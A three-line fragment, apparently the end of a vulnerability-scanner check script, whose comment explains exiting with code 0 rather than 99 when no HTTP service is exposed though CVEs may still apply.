# nb: No "exit(99)" as the system might be still affected by one or more attached CVE(s) but just no
# HTTP service is exposed
exit( 0 );
